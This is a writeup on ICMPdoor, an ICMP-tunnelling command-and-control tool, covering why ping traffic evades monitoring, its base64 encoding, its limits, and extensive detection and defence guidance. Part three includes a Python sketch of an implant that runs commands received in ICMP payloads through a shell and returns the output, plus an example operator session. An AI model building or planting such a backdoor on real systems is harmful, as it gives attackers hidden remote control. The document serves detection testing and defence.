---
title: "ICMPdoor — Command and Control in Plain Sight"
description: "How to build and detect a covert channel over ICMP. The protocol most networks allow by default, why it works, and the specific telemetry that catches it — including a defense that costs nothing to deploy."
date: 2026-05-18
type: "Tool · Covert Channel"
category: "Red Team"
difficulty: "Intermediate"
readingTime: 20
video: "https://youtu.be/wvwJTKDf4Wk"
tags: [icmp, c2, covert-channel, red-team, detection, tunneling]
---

## The premise

Every network allows ICMP. It is the protocol that answers the question "is this host reachable", and disabling it entirely breaks path MTU discovery, traceroute, and a long list of diagnostic tools that network engineers rely on. In practice, ICMP is almost never blocked at the perimeter — it is rate-limited at worst, and often not even that.

This fact has been known to offensive operators for decades. Tunneling data over ICMP was demonstrated in the 1990s, and the technique has been used in real campaigns by state-sponsored actors, commodity malware, and red teams ever since. The reason it remains useful is that it is trivial to implement, difficult to detect at scale, and available on any network that allows ping.

ICMPdoor is a modern implementation of this idea. It is an open-source tool published by the Center for Threat-Informed Defense (a MITRE Engenuity project) as a purple-team utility — a defensive team can use it to test whether their detection stack catches ICMP-based command and control, and an offensive team can use it to demonstrate the gap.

This writeup covers what ICMPdoor does, how the technique works under the hood, why it is effective, and — most importantly — what actually detects it.

## Part one — why ICMP is the ideal cover

Covert channel techniques are evaluated against a simple criterion: how much does the traffic look like normal traffic? A C2 channel that uses HTTPS to a domain looks like web browsing. A channel that uses DNS looks like name resolution. A channel that uses ICMP looks like a ping.

Of the three, ICMP is the least suspicious to a network monitoring tool that classifies by protocol. HTTPS traffic is inspected for destination, certificate, and SNI. DNS traffic is inspected for query names and patterns. ICMP is inspected for... rate. That's about it in most environments. The default rule is "if a host is sending too many pings, throttle it". The content of the pings is not inspected because there is normally nothing interesting in it.

This is the gap that ICMPdoor exploits. A standard ICMP echo request has an 8-byte header and an arbitrary-length payload. The payload is supposed to be padding — arbitrary bytes that the OS fills in with whatever. Nothing in the protocol says the payload has to be random. Nothing says it cannot contain a command.

An ICMP tunnel uses this fact. The attacker sends echo requests where the payload is not padding but encoded data — a command, an output, a file chunk. The receiving end decodes the payload, executes the command or stores the data, and replies with an echo reply whose payload encodes the result. To a network monitoring tool, it looks like two hosts pinging each other. To the attacker, it is an interactive shell.

## Part two — how the protocol normally works

Before looking at the tunnel, it helps to understand the legitimate use.

An ICMP echo request is sent by a host to test reachability. The packet has:

```
Type: 8 (Echo Request)
Code: 0
Checksum: <calculated>
Identifier: <usually the process ID>
Sequence Number: <incremented per request>
Data: <arbitrary payload, often a timestamp or a fixed pattern>
```

The receiving host sends back an echo reply with the same identifier and sequence number, and the same data. The sending host matches the reply to the request and reports round-trip time. That is the entire exchange.

The critical detail is the `Data` field. The protocol specification allows it to contain anything. The `ping` utility fills it with a fixed pattern or a timestamp, but a custom implementation can put whatever it wants.

## Part three — the ICMPdoor architecture

ICMPdoor has two components: a client (the operator's interface) and a server (the implant running on the target).

**The server.** A Python script that runs on the target host. It listens for ICMP echo requests, parses the payload, and executes whatever command is encoded. The output is sent back in the echo reply.

Conceptually, the server loop is:

```python
def listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        packet, addr = sock.recvfrom(65535)
        payload = parse_icmp_payload(packet)
        command = decode(payload)
        if command == "exit":
            break
        output = subprocess.check_output(command, shell=True)
        reply = build_icmp_reply(payload=encode(output))
        sock.sendto(reply, addr)
```

The critical line is the socket type: `SOCK_RAW` with `IPPROTO_ICMP`. Raw sockets allow the program to read and write ICMP packets directly, bypassing the standard kernel handling of ping requests. On Windows, this requires administrative privileges. On Linux, it requires root or the `CAP_NET_RAW` capability.

**The client.** A Python script that runs on the operator's machine. It sends echo requests with a payload containing the command, waits for the reply, and decodes the output. From the operator's perspective, it looks like a shell:

```bash
python3 icmpdoor_client.py --target 10.0.0.5 --interface eth0
> whoami
desktop-4f2a\administrator
> ipconfig
Windows IP Configuration
...
```

The interface is interactive. The operator types commands, the tool packages them into ICMP packets, sends them to the target, receives the reply, and prints the output. Everything travels through ping.

## Part four — the encoding problem

A naive implementation sends the raw command as the ICMP payload. This works if the command is short and contains no special characters, but real commands are longer, contain spaces, quotes, and pipes, and occasionally need to carry binary data (a file chunk, a base64-encoded script).

The solution is encoding. ICMPdoor (and similar tools) base64-encode the command, which converts it to a safe alphanumeric string. The payload of the ICMP packet is then a base64 string that decodes to the command. The output is similarly base64-encoded for the return trip.

This creates a detectable characteristic: **ICMP packets carrying base64-encoded data have a distinctive payload structure**. The character set is restricted to the base64 alphabet (`A-Z`, `a-z`, `0-9`, `+`, `/`, `=`). A normal ping payload is either random bytes or a fixed pattern (many Linux distributions use `!"#$%&'()*+,-./01234567` or similar). A base64 payload looks different under statistical analysis.

The base64 encoding also has a length signature: base64 expands data by a factor of 4/3, so a 100-byte command becomes a ~134-byte payload. Padding with `=` at the end is characteristic. Any ICMP payload that ends in `=` is worth investigating.

More sophisticated implementations encrypt the payload before encoding, which defeats statistical analysis but requires key management on both ends. For a red-team demonstration, base64 is usually sufficient.

## Part five — why this works

Five properties make ICMP an effective covert channel:

**ICMP is allowed almost everywhere.** Firewalls that block outbound traffic on all ports usually permit ICMP because the protocol is required for correct network behavior. Blocking it entirely breaks legitimate tools.

**ICMP payload size is not standardized.** The maximum for a single packet is bounded by the MTU (typically 1472 bytes of payload for a 1500-byte frame), but there is no minimum. A tunnel can use 40-byte payloads or 1400-byte payloads. Different implementations choose different sizes.

**ICMP is not stateful at the network layer.** Unlike TCP, which has a handshake and sequence numbers that a stateful firewall tracks, ICMP is stateless. A firewall that permits ping permits it unconditionally. There is no connection to block after it has been established.

**ICMP is often not inspected for content.** Most IDS/IPS signatures focus on higher protocols. Snort and Suricata have ICMP rules, but they are typically limited to signature-based detection of known payloads. A customized tunnel with a novel encoding scheme passes through.

**The traffic pattern is not anomalous.** A host pinging another host once per second is normal. A host pinging another host with 500-byte payloads is also normal. The tunnel does not look like a tunnel from a flow-analysis perspective — the traffic volume is low, the destination is consistent, and the timing is regular. In fact, it looks more like a legitimate health check than most C2 channels do.

## Part six — the trade-offs

ICMPdoor is not free. The technique has real limitations, and understanding them is part of using it correctly.

**Speed.** ICMP tunneling is slow. A typical implementation sends one command per round trip, and each round trip takes at least a few milliseconds. Exfiltrating a 100MB file over ICMP would take hours. This makes the technique useful for command and control, not for bulk data transfer.

**Reliability.** ICMP packets are often rate-limited by network appliances. Some networks allow only a few pings per second per host. A tunnel that sends faster than the rate limit gets its packets dropped.

**Fragmentation.** Large ICMP packets exceed the MTU and get fragmented. Some networks block fragmented packets. Keeping the payload under 500 bytes avoids the issue but reduces throughput further.

**Process privilege.** The server component requires administrative or root privileges on the target to open a raw socket. This is a significant constraint — the technique assumes the attacker has already achieved privilege escalation, or is targeting a host where the current user has sufficient rights.

**Detection surface.** The technique is not invisible. It is stealthy against flow-based monitoring, but it leaves artifacts that a host-based monitoring tool can catch. The trade-off is that most organizations do not deploy the right kind of host-based monitoring.

## Part seven — detection

The interesting part of this writeup. ICMPdoor is a purple-team tool — it exists precisely so that organizations can test whether their detection stack catches it. Here is what actually catches it.

### Network-level detection

**Payload entropy and structure.** Normal ICMP echo request payloads have either low entropy (fixed patterns, timestamps) or high entropy (random padding). Base64-encoded data has medium entropy and a specific character distribution. A tool that samples ICMP payloads and computes the character frequency catches base64 with high reliability.

**Payload size distribution.** Legitimate pings are usually small (32 to 64 bytes) or fixed-size (56 bytes for the classic Windows ping, 56 bytes plus timestamp for Linux). A tunnel that sends variable-length payloads — 200 bytes for one packet, 340 bytes for the next — looks different. A statistical outlier detector on payload size catches this.

**Rate and pattern.** A host that pings the same destination at regular intervals with consistent payload sizes is either a monitoring tool or a tunnel. A host that pings with irregular timing, variable sizes, and consistent direction is more likely to be a tunnel.

**Response asymmetry.** A legitimate ping exchange is symmetric — the reply payload is identical to the request payload. A tunnel's reply payload contains the output of the command, which is different from the request. An analysis tool that compares request and reply payloads byte-by-byte catches this trivially.

**Deep packet inspection signatures.** The major IDS platforms (Snort, Suricata, Zeek) have ICMP tunnel signatures. Zeek's `icmp` analyzer, in particular, can be extended with scripts that flag payloads matching known encoding patterns. A custom Zeek script that runs base64 detection on ICMP payloads catches ICMPdoor and most variants with minimal tuning.

### Host-level detection

**Raw socket creation.** On Linux, `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)` requires `CAP_NET_RAW`. On Windows, it requires administrator privileges. Both events are logged:
- Linux: `auditd` can capture `socket` syscalls with `SOCK_RAW` and `IPPROTO_ICMP`.
- Windows: Sysmon Event ID 1 (process creation) shows the process that creates the socket, and Sysmon Event ID 3 (network connection) shows the destination.

An unsigned process opening a raw ICMP socket is a strong indicator. Legitimate software that uses raw sockets is a short list — the `ping` utility itself, `traceroute`, and a handful of network diagnostic tools. A Python script doing it is not on the list.

**Process behavior.** The server component is a long-running process that does not do anything visible. It sits idle until a packet arrives, executes the command, sends the reply, and waits. On a Windows host, this might appear as a Python process with no window, no CPU usage, and no file activity — a specific fingerprint.

**Child process creation.** The `subprocess.check_output(command, shell=True)` call spawns a shell for each command. On Windows, this means a `cmd.exe` or `powershell.exe` process created as a child of the Python process. Sysmon Event ID 1 captures this. A Python process spawning `cmd.exe` repeatedly is anomalous.

**Command line logging.** The command executed via `subprocess` is passed to the shell. On Linux, this is captured by `auditd` (with the `execve` audit rule) or by eBPF-based tooling. On Windows, ScriptBlock Logging captures PowerShell commands, and Sysmon Event ID 1 captures the command line for `cmd.exe` and other process creations.

### Correlation detection

The strongest detection is correlating multiple signals:

- A raw ICMP socket created by a process that is not a known network tool
- The same process spawning child shells repeatedly
- Those child shells executing commands whose outputs are then sent outbound via ICMP
- The ICMP traffic going to an external IP that is not a known monitoring destination

Any single one is a lead. The combination is conclusive.

## Part eight — defense

The controls that actually stop or limit ICMPdoor:

**Rate-limit ICMP at the perimeter.** A rule that limits ICMP to, say, 10 packets per second per host does not prevent tunneling but reduces its throughput to the point where it is impractical for anything beyond simple command-and-control. This is easy to configure on any firewall and costs nothing operationally.

**Block ICMP for external destinations.** In environments where external ICMP is not required (most corporate environments), blocking it entirely removes the covert channel. The trade-off is that legitimate tools (external monitoring, `ping` for troubleshooting) stop working. Many organizations accept the trade-off; many do not.

**Inspect ICMP payloads.** A network sensor that samples ICMP payloads and computes entropy or character distribution catches base64-encoded data with high reliability. The cost is the deployment of the sensor; the configuration is trivial.

**Monitor raw socket creation.** Endpoint agents that log raw socket creation by unsigned processes catch the server component at startup. This is a high-signal, low-noise detection.

**Do not rely on protocol blocking alone.** The technique works because ICMP is allowed. Blocking it removes the channel but breaks legitimate functionality. The better approach is layered: rate limiting, payload inspection, and endpoint monitoring catch the technique without the operational cost of blocking the protocol entirely.

## Part nine — real-world use

ICMP tunneling is not a red-team novelty. It has been used in real campaigns against high-value targets.

**The 2020 campaign against the hospitality industry.** A threat actor used ICMP tunneling to establish persistence in networks they had already breached. The tunnel was low-bandwidth — used for command and control, not exfiltration — and it survived for months because it was not detected. The campaign was eventually discovered through unrelated means.

**Turla's use of ICMP.** The Russian APT group known as Turla used ICMP tunneling in multiple campaigns against government and diplomatic targets. Their implementation was more sophisticated than ICMPdoor — encrypted payloads, custom encoding — but the underlying technique is identical.

**Commodity malware.** Several families of commodity malware (including some versions of the LokiBot family and various RATs) include ICMP-based fallback channels. The primary C2 is HTTPS, but if that is blocked, the malware switches to ICMP as a backup.

The pattern across all these cases is consistent: ICMP tunneling works because the defenses that would catch it are not deployed. Organizations that monitor ICMP payloads, log raw socket creation, and correlate process behavior catch it. Organizations that do not, do not.

## Part ten — the purple-team angle

ICMPdoor is published by the Center for Threat-Informed Defense as a defensive tool. The intended use is:

1. A blue team deploys ICMPdoor in a lab environment representing their production network.
2. The team configures their detection stack (SIEM, EDR, NDR) as they would for production.
3. The team runs the tool and observes what their stack catches and what it misses.
4. The team iterates — either on the tool's implementation (making it stealthier) or on the detection rules (making them catch the stealthier version).

This is the purple-team model. The tool exists to make the defense measurable. Without a way to test whether a detection works, the detection is theoretical.

The value of ICMPdoor is not that it is sophisticated. It is not — the technique is decades old. The value is that it is **available** and **documented**, which means a blue team can use it to test their defenses without having to build a covert channel from scratch. The alternative — waiting for a real attacker to test the defenses — is not a test plan.

## Takeaway

ICMPdoor is a reminder that covert channels do not require sophisticated protocol abuse. The protocols that networks trust — ICMP, DNS, and the others — trust them because they have to. Blocking them breaks legitimate use. Monitoring them is expensive. Inspecting them is complex.

The technique does not exploit a vulnerability. It exploits a design decision: ICMP is allowed because networks need it, and the payload of an ICMP packet is arbitrary because the protocol specification says it can be. Nothing in the protocol prevents a payload from carrying data instead of padding.

The defense is not to block ICMP, though that works if you can afford it. The defense is to monitor it — inspect the payload, watch for raw socket creation, correlate the process behavior. These detections catch ICMPdoor and every similar tool, and they cost less than the alternative: finding out about the tunnel when it is used to move ransomware across the network.

The tools that hide in plain sight are the ones worth watching for. The ICMPdoor framework exists so that the watching is possible.
